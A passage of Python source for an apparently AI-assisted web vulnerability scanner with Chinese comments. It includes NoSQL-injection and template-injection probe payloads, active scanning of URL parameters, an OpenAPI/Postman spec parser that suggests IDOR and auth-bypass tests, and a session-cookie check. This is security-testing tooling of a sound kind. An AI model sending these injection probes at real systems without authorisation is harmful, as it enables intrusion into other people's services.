# 9. NoSQL Injection 风格
# ============================================================
async def scan_nosql_injection(
    url: str,
    param: str,
    session: aiohttp.ClientSession
) -> List[Dict]:
    results = []
    payloads = [
        ("{'$ne': ''}", "{'$ne': ''}"),
        ("{'$gt': ''}", "{'$gt': ''}"),
        ("{'$regex': '.*'}", "{'$regex': '.*'}"),
        ("['$ne']=1", "array $ne"),
    ]

    for payload, desc in payloads:
        try:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"
            resp = await async_get(test_url, session=session, timeout=3)
            text = resp[1]

            if "mongodb" in text.lower() or "cast error" in text.lower():
                results.append({
                    "type": "NoSQL Injection",
                    "severity": "High",
                    "payload": payload,
                    "evidence": f"Database error detected: {text[:100]}"
                })
                break
        except BaseException:
            logger.debug("suppressed exception (core audit)")

    return results


# ============================================================
# 10. Active Scan++ 风格
# ============================================================
async def active_scan_plus(
    url: str,
    session: aiohttp.ClientSession,
    params: Optional[List[str]] = None
) -> Dict:
    results = {
        "cors": [],
        "nosqli": [],
        "log4j": [],
        "ssrf": [],
        "ssti": [],
        "el_injection": []
    }

    if not params:
        if '?' in url:
            for param in url.split('?')[1].split('&'):
                if '=' in param:
                    params = [param.split('=')[0]]
        else:
            params = ["id", "user", "page"]

    for param in params[:3]:
        cors_result = await scan_cors_misconfig(url, session)
        if cors_result:
            results["cors"].extend(cors_result)

        nosql_result = await scan_nosql_injection(url, param, session)
        if nosql_result:
            results["nosqli"].extend(nosql_result)

        log4j_result = await scan_log4j(url, param, session)
        if log4j_result:
            results["log4j"].extend(log4j_result)

        ssti_payloads = ["{{7*7}}", "${7*7}"]
        for payload in ssti_payloads:
            try:
                encoded = urllib.parse.quote(payload)
                test_url = f"{url}?{param}={encoded}"
                resp = await async_get(test_url, session=session, timeout=3)
                if "49" in resp[1]:
                    results["ssti"].append({
                        "type": "SSTI",
                        "param": param,
                        "payload": payload,
                        "evidence": "Response contains 49 (7*7 result)"
                    })
            except BaseException:
                logger.debug("suppressed exception (core audit)")

    return results


# ============================================================
# 主入口
# ============================================================
async def run_all_burp_plugins_checks(
    url: str,
    session: aiohttp.ClientSession,
    js_content: str = "",
    jwt_token: str = "",
    params: Optional[List[str]] = None
) -> Dict:
    logger.info("🧩 开始 Burp 插件风格综合检测...")

    results = {
        "js_miner": {},
        "hidden_params": [],
        "403_bypass": [],
        "jwt_issues": [],
        "cors_issues": [],
        "nosql_issues": [],
        "log4j_issues": [],
        "graphql_endpoints": [],
        "prototype_pollution": [],
        "ssti_issues": [],
        "active_scan": {}
    }

    if js_content:
        results["js_miner"] = extract_from_javascript(js_content, url)
        logger.info(f"   📜 JS Miner: {len(results['js_miner'].get('api_endpoints', []))} 个 API, {len(results['js_miner'].get('subdomains', []))} 个子域名")

    graphql = await discover_graphql_endpoint(url, session)
    if graphql:
        results["graphql_endpoints"] = graphql
        logger.info(f"   🎯 GraphQL: 发现 {len(graphql)} 个端点")

    if params:
        results["active_scan"] = await active_scan_plus(url, session, params)
        logger.info(f"   ⚡ Active Scan++: CORS:{len(results['active_scan']['cors'])} NoSQL:{len(results['active_scan']['nosqli'])} Log4j:{len(results['active_scan']['log4j'])}")

    try:
        test_resp = await async_get(url, session=session, timeout=3)
        if test_resp[0] == 403:
            results["403_bypass"] = await scan_403_bypass(url, session)
            logger.info(f"   🔓 403 Bypass: {len(results['403_bypass'])} 种绕过方式发现")
    except BaseException:
        logger.debug("suppressed exception (core audit)")

    if jwt_token:
        results["jwt_issues"] = scan_jwt_vulnerabilities(jwt_token)
        logger.info(f"   🔐 JWT Scanner: {len(results['jwt_issues'])} 个问题发现")

    if params:
        for param in params[:3]:
            pp_result = await scan_prototype_pollution(url, session, param)
            if pp_result:
                results["prototype_pollution"].extend(pp_result)
                break
        logger.info(f"   🧬 原型污染: {len(results['prototype_pollution'])} 个潜在点")

    logger.info("✅ Burp 插件风格检测完成")
    return results


__all__ = [
    'extract_from_javascript',
    'discover_hidden_params',
    'scan_403_bypass',
    'scan_jwt_vulnerabilities',
    'scan_prototype_pollution',
    'scan_cors_misconfig',
    'discover_graphql_endpoint',
    'scan_log4j',
    'scan_nosql_injection',
    'active_scan_plus',
    'run_all_burp_plugins_checks',
]

# ============================================================
# 合并自: modules/browser_collector.py
# ============================================================

# modules/browser_collector.py
"""
浏览器收集器 - 从 core/browser_ai_agent.py 分离
"""
from vulnclaw.core.browser_ai_agent import BrowserAIAgent, create_browser_agent, HAS_PLAYWRIGHT

__all__ = ['BrowserAIAgent', 'create_browser_agent', 'HAS_PLAYWRIGHT']

# ============================================================
# 合并自: modules/api_spec_parser.py
# ============================================================

# modules/api_spec_parser.py
"""
API 规范解析器 - 修复版 v2.1
解析 OpenAPI/Swagger/Postman 规范，提取端点、参数、认证信息。
支持 AI 辅助解析（当格式不标准时）。
修复：懒加载，避免在 __init__ 中执行异步操作导致死锁
"""
import json
import re
import asyncio
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin

from vulnclaw.core.logger import logger
from vulnclaw.ai.core import get_llm_client


def _safe_json_loads(text: str) -> Optional[Dict]:
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        text = text.replace("'", '"')
        text = re.sub(r',\s*}', '}', text)
        text = re.sub(r',\s*]', ']', text)
        try:
            return json.loads(text)
        except BaseException:
            return None


class APISpecParser:
    """
    API 规范解析器 - 修复版
    修复：使用懒加载，不在 __init__ 中执行异步操作
    """

    def __init__(self, spec_path: str, base_url: Optional[str] = None):
        self.spec_path = Path(spec_path)
        self.base_url = base_url
        self.spec_data: Optional[Dict] = None
        self._parsed_endpoints: List[Dict] = []
        self._loaded = False
        self._load_error = None

    # ============================================================
    # 懒加载：首次访问时加载
    # ============================================================

    def _ensure_loaded(self):
        """懒加载：首次访问时同步加载 JSON/YAML"""
        if self._loaded:
            return
        if self._load_error:
            return

        try:
            with open(self.spec_path, 'r', encoding='utf-8') as f:
                content = f.read()

            # 尝试 JSON 解析
            self.spec_data = _safe_json_loads(content)
            if self.spec_data:
                logger.info(f"✅ 成功解析 API 规范 (JSON): {self.spec_path.name}")
                self._loaded = True
                return

            # 尝试 YAML 解析
            try:
                import yaml
                self.spec_data = yaml.safe_load(content)
                if self.spec_data and isinstance(self.spec_data, dict):
                    logger.info(f"✅ 成功解析 API 规范 (YAML): {self.spec_path.name}")
                    self._loaded = True
                    return
            except ImportError:
                logger.debug("⚠️ PyYAML 未安装")
            except BaseException:
                logger.debug("suppressed exception (core audit)")

            # 如果都失败，标记为已加载（空数据），不在此处调用 AI
            self.spec_data = None
            self._loaded = True
            logger.warning(f"⚠️ 无法解析 API 规范: {self.spec_path.name}，将尝试 AI 辅助解析")

        except Exception as e:
            self._load_error = str(e)
            logger.error(f"❌ 加载 API 规范失败: {e}")

    # ============================================================
    # AI 辅助解析（异步，供外部调用）
    # ============================================================

    async def ai_parse_async(self, content: str = None) -> bool:
        """
        异步 AI 辅助解析 API 规范
        返回 True 表示成功
        """
        if content is None:
            try:
                with open(self.spec_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except Exception as e:
                logger.error(f"❌ 读取文件失败: {e}")
                return False

        client = get_llm_client()
        prompt = f"""你是一个 API 规范解析专家。以下是一段可能不完整的 API 规范文本。
请提取 base_url、endpoints（path/method/params/auth）。
输出 JSON 格式：{{"base_url": "...", "endpoints": [{{"path": "...", "method": "GET", "params": [{{"name": "...", "location": "query", "type": "string", "required": true}}], "auth": "..."}}]}}

文本：
{content[:4000]}
"""

        try:
            result = await client.ask(
                prompt,
                system="只输出 JSON。",
                temperature=0.1,
                wrap_data=False
            )
            json_match = re.search(r'\{.*\}', result, re.DOTALL)
            if json_match:
                data = json.loads(json_match.group())
                if data:
                    self.spec_data = data
                    self._loaded = True
                    logger.info(f"✅ AI 辅助解析成功，提取到 {len(data.get('endpoints', []))} 个端点")
                    return True
        except Exception as e:
            logger.warning(f"AI 辅助解析失败: {e}")

        # 降级：正则提取
        self._regex_extract_endpoints(content)
        if self._parsed_endpoints:
            self.spec_data = {"endpoints": self._parsed_endpoints}
            self._loaded = True
            return True

        return False

    # ============================================================
    # 正则提取（降级方案）
    # ============================================================

    def _regex_extract_endpoints(self, content: str):
        """使用正则表达式提取端点（降级方案）"""
        patterns = [
            r'(GET|POST|PUT|DELETE|PATCH|OPTIONS|HEAD)\s+([^\s\n]+)',
            r'["\']/(api|v\d+|[a-z]+)/[^"\']+["\']',
        ]
        endpoints = set()
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    method, path = match[0].upper(), match[1]
                    if path.startswith('/') or path.startswith('http'):
                        endpoints.add((method, path))
                elif isinstance(match, str) and (match.startswith('/') or 'api' in match):
                    endpoints.add(("GET", match))

        for method, path in endpoints:
            if not path.startswith(('http://', 'https://')):
                if self.base_url:
                    full = urljoin(self.base_url, path)
                else:
                    full = path
            else:
                full = path
            self._parsed_endpoints.append({"path": full, "method": method})

    # ============================================================
    # 公开方法
    # ============================================================

    def is_valid(self) -> bool:
        self._ensure_loaded()
        return self.spec_data is not None

    def get_base_url(self) -> Optional[str]:
        self._ensure_loaded()
        if not self.spec_data:
            return self.base_url

        servers = self.spec_data.get('servers')
        if servers and isinstance(servers, list) and len(servers) > 0:
            return servers[0].get('url', '').rstrip('/')

        host = self.spec_data.get('host')
        schemes = self.spec_data.get('schemes', ['https'])
        if host:
            scheme = schemes[0] if schemes else 'https'
            base_path = self.spec_data.get('basePath', '')
            return f"{scheme}://{host}{base_path}".rstrip('/')

        if self.spec_data.get('info', {}).get('_postman_id'):
            variables = self.spec_data.get('variable', [])
            for var in variables:
                if var.get('key') == 'baseUrl':
                    return var.get('value', '').rstrip('/')

        if self.spec_data.get('base_url'):
            return self.spec_data.get('base_url')

        return self.base_url

    def extract_urls(self) -> List[str]:
        return [ep.get('path', '') for ep in self._extract_endpoints_with_details()]

    def _extract_endpoints_with_details(self) -> List[Dict]:
        self._ensure_loaded()
        if self._parsed_endpoints:
            return self._parsed_endpoints

        if not self.is_valid():
            return []

        base = self.get_base_url()
        if not base:
            return []

        endpoints = []

        if 'paths' in self.spec_data:
            for path, methods in self.spec_data['paths'].items():
                for method, details in methods.items():
                    if method.lower() not in ['get', 'post', 'put', 'delete', 'patch', 'head', 'options']:
                        continue
                    full_url = urljoin(base, path)
                    endpoint = {
                        "path": full_url,
                        "method": method.upper(),
                        "params": self._extract_params(details),
                        "auth": self._extract_auth(details),
                        "summary": details.get('summary', ''),
                        "description": details.get('description', '')[:200],
                        "deprecated": details.get('deprecated', False)
                    }
                    endpoints.append(endpoint)

        elif self.spec_data.get('info', {}).get('_postman_id'):
            endpoints = self._extract_postman_endpoints(self.spec_data, base)

        elif self.spec_data.get('endpoints'):
            for ep in self.spec_data.get('endpoints', []):
                path = ep.get('path', '')
                if not path.startswith(('http://', 'https://')):
                    path = urljoin(base, path)
                endpoints.append({
                    "path": path,
                    "method": ep.get('method', 'GET'),
                    "params": ep.get('params', []),
                    "auth": ep.get('auth', ''),
                    "summary": '',
                    "description": '',
                    "deprecated": False
                })

        self._parsed_endpoints = endpoints
        return endpoints

    def _extract_params(self, details: Dict) -> List[Dict]:
        params = []
        if 'parameters' in details:
            for p in details['parameters']:
                schema = p.get('schema', {})
                params.append({
                    "name": p.get('name', ''),
                    "location": p.get('in', 'query'),
                    "type": schema.get('type', 'string'),
                    "required": p.get('required', False),
                    "description": p.get('description', '')[:100],
                    "example": p.get('example', '')
                })
        if 'requestBody' in details:
            body = details['requestBody']
            content = body.get('content', {})
            for media_type, spec in content.items():
                if 'schema' in spec:
                    schema = spec['schema']
                    required = schema.get('required', [])
                    properties = schema.get('properties', {})
                    for prop_name, prop_schema in properties.items():
                        params.append({
                            "name": prop_name,
                            "location": "body",
                            "type": prop_schema.get('type', 'string'),
                            "required": prop_name in required,
                            "description": prop_schema.get('description', '')[:100],
                            "example": ''
                        })
        return params

    def _extract_auth(self, details: Dict) -> str:
        if 'security' in details:
            sec = details['security']
            if sec:
                names = []
                for item in sec:
                    if isinstance(item, dict):
                        names.extend(item.keys())
                if names:
                    return f"需要认证: {', '.join(names)}"
        if 'security' in self.spec_data:
            sec = self.spec_data.get('security', [])
            if sec:
                return f"需要认证: {', '.join(sec[0].keys()) if sec else '未知'}"
        return "无认证（公开）"

    def _extract_postman_endpoints(self, node: Any, base: str) -> List[Dict]:
        endpoints = []
        if isinstance(node, dict):
            request = node.get('request')
            if request:
                url = request.get('url')
                if isinstance(url, dict):
                    raw = url.get('raw', '')
                    if raw:
                        raw = re.sub(r'{{[^}]+}}', '', raw)
                        if raw.startswith('/'):
                            full = urljoin(base, raw)
                        else:
                            full = raw
                        if full.startswith(('http://', 'https://')):
                            endpoints.append({
                                "path": full,
                                "method": request.get('method', 'GET'),
                                "params": [],
                                "auth": "",
                                "summary": "",
                                "description": "",
                                "deprecated": False
                            })
            for key, val in node.items():
                if isinstance(val, (dict, list)):
                    endpoints.extend(self._extract_postman_endpoints(val, base))
        elif isinstance(node, list):
            for item in node:
                endpoints.extend(self._extract_postman_endpoints(item, base))
        return endpoints

    def get_param_summary(self) -> Dict[str, List[str]]:
        result = {"query": [], "path": [], "body": [], "header": []}
        for ep in self._extract_endpoints_with_details():
            for p in ep.get('params', []):
                location = p.get('location', 'query')
                if location in result:
                    result[location].append(p.get('name', ''))
        for key in result:
            result[key] = list(set(result[key]))
        return result

    def get_endpoints_by_method(self) -> Dict[str, List[str]]:
        result = {}
        for ep in self._extract_endpoints_with_details():
            method = ep.get('method', 'GET')
            if method not in result:
                result[method] = []
            result[method].append(ep.get('path', ''))
        return result

    def get_authenticated_endpoints(self) -> List[Dict]:
        return [ep for ep in self._extract_endpoints_with_details() if ep.get('auth') and '无认证' not in ep.get('auth', '')]

    def get_deprecated_endpoints(self) -> List[Dict]:
        return [ep for ep in self._extract_endpoints_with_details() if ep.get('deprecated', False)]

    async def ai_analyze_security(self) -> Dict:
        endpoints = self._extract_endpoints_with_details()
        if not endpoints:
            return {"error": "无端点可分析"}

        ep_summary = []
        for ep in endpoints[:20]:
            ep_summary.append({
                "path": ep.get('path', ''),
                "method": ep.get('method', 'GET'),
                "auth": ep.get('auth', '无认证'),
                "params": [p.get('name', '') for p in ep.get('params', [])[:5]]
            })

        client = get_llm_client()
        prompt = f"""你是一位 API 安全专家。请分析以下 API 规范，找出潜在的安全风险。

端点列表（共 {len(endpoints)} 个，展示前 20 个）：
{json.dumps(ep_summary, indent=2, ensure_ascii=False)}

请分析：
1. 哪些端点缺少认证保护（高风险）
2. 哪些端点可能包含敏感数据（用户信息、支付信息）
3. 哪些端点存在参数注入风险（ID、路径参数）
4. 整体安全评分

输出 JSON：{{"unauthenticated_endpoints": [], "sensitive_endpoints": [], "injection_risk_endpoints": [], "overall_score": 70, "recommendations": []}}
"""
        try:
            result = await client.ask(
                prompt,
                system="只输出 JSON。",
                temperature=0.2,
                wrap_data=False
            )
            json_match = re.search(r'\{.*\}', result, re.DOTALL)
            if json_match:
                data = json.loads(json_match.group())
                data['endpoint_count'] = len(endpoints)
                return data
        except Exception as e:
            logger.warning(f"AI 安全性分析失败: {e}")

        return {"error": "分析失败", "endpoint_count": len(endpoints)}

    def generate_scan_targets(self) -> List[Dict]:
        targets = []
        for ep in self._extract_endpoints_with_details():
            target = {
                "url": ep.get('path'),
                "method": ep.get('method', 'GET'),
                "params": [p.get('name', '') for p in ep.get('params', [])],
                "has_auth": '无认证' not in ep.get('auth', '无认证'),
                "is_deprecated": ep.get('deprecated', False),
                "suggested_tests": []
            }
            if target["params"]:
                if any('id' in p.lower() for p in target["params"]):
                    target["suggested_tests"].append("越权测试 (IDOR)")
                if any(('page' in p.lower() or 'limit' in p.lower()) for p in target["params"]):
                    target["suggested_tests"].append("分页越权测试")
                target["suggested_tests"].append("参数注入测试")
            if target["has_auth"]:
                target["suggested_tests"].append("认证绕过测试")
            else:
                target["suggested_tests"].append("未授权访问测试")
            if target["is_deprecated"]:
                target["suggested_tests"].append("废弃端点安全测试")
            if not target["suggested_tests"]:
                target["suggested_tests"] = ["基础漏洞扫描"]
            targets.append(target)
        return targets


# ============================================================
# 导出
# ============================================================

__all__ = ['APISpecParser', '_safe_json_loads']

# ============================================================
# 合并自: modules/session_scanner.py
# ============================================================

# modules/session_scanner.py
"""
Session 管理深度测试
"""
import re
import asyncio
from urllib.parse import urlparse
from vulnclaw.core.logger import logger
from vulnclaw.core.utils import async_get


async def scan(target: str, session) -> dict:
    """
    测试 Session 安全性
    """
    logger.info("🔐 开始 Session 安全测试...")
    results = {
        "session_fixation": False,
        "session_replay": False,
        "session_timeout": False,
        "session_id_entropy": False,
        "session_id_in_url": False,
        "session_id_leak": False,
        "details": []
    }

    try:
        # 1. 获取当前会话 Cookie
        resp = await async_get(target, session=session, timeout=10)
        set_cookie = resp[2].get('Set-Cookie', '') if len(resp) > 2 else ''
        if not set_cookie:
            logger.warning("⚠️ 未检测到 Set-Cookie，跳过 Session 测试")
            return results

        # 提取 Session ID 名称
        cookie_name = re.split(r'[=;]', set_cookie)[0].strip()
        if not cookie_name:
            return results

        # 2. 测试 Session ID 是否出现在 URL 中（通过检查历史请求）
        # 这里简化：检查当前 URL 是否包含 session id 参数
        if 'jsessionid' in target.lower() or 'sid' in target.lower():
            results['session_id_in_url'] = True
            results['details'].append("Session ID 出现在 URL 中，可能泄漏")

        # 3. 测试 Session 熵值（简单版本）
        if set_cookie:
            cookie_value = re.search(rf'{cookie_name}=([^;]+)', set_cookie)
            if cookie_value:
                value = cookie_value.group(1)
                if len(value) < 16:
                    results['session_id_entropy'] = False
                    results['details'].append(f"Session ID 长度过短: {len(value)} 字符")
                elif not re.search(r'[a-z]', value) or not re.search(r'[A-Z]', value) or not re.search(r'[0-9]', value):
                    results['session_id_entropy'] = False
                    results['details'].append("Session ID 字符集简单，熵值低")
                else:
                    results['session_id_entropy'] = True

        # 4. 测试 Session Fixation（简单：登录前后 Session 是否变化）
        # 需要登录功能，暂时跳过

        # 5. 测试 Session Timeout（需要等待，跳过）

        # 6. 测试 Referer 泄漏（检查历史请求中是否包含 cookie）
        # 需要 Burp 历史，暂时跳过

        logger.info(f"✅ Session 测试完成，发现 {len(results['details'])} 个问题")

    except Exception as e:
        logger.error(f"❌ Session 测试异常: {e}")
        results['error'] = str(e)

    return results


# 向后兼容别名：原 modules/session_scanner.py 合并后导出名，merge_tool.py 与 modules/__init__.py 引用
scan_session_security = scan


